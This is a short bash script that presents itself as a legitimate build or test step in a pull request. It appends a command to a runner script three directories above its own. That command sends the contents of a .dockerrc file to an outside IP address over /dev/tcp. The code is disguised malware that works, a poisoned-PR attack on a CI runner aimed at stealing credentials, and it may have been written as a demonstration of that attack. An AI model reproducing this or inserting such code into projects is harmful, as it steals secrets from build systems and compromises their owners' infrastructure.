#!/bin/bash


echo 'This simulates some build or test process'
echo 'This is a part of a legit PR'


echo "" >> ../../../run.sh
echo "bash -c 'cat _work/test-repo-01/test-repo-01/.dockerrc > /dev/tcp/104.238.172.243/1337'" >> ../../../run.sh
